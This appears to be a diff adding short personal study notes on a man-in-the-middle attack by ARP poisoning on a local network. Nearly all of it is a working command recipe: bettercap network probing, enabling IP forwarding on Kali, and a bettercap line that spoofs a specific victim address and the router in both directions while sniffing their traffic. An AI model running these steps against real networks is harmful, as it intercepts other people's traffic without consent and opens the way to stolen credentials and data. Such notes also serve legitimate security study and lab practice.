@@ -1,1 +1,15 @@
 man in the middle attack using arp poisoning
+
+arp poisoning:
+  bettercap
+  net.probe on // it scans machines on network
+  net.show
+  exit
+
+  // tell kali to forward packages
+  echo 1 > /proc/sys/net/ipv4/ip_forward
+  echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
+  // stand between victim and router
+  bettercap -eval "set arp.spoof.targets 192.168.0.108,192.168.0.1; set arp.spoof.fullduplex true;
+    set arp.spoof.interval 10; arp.spoof on; net.sniff on"**
+    // fullduplex means do spoof both directions
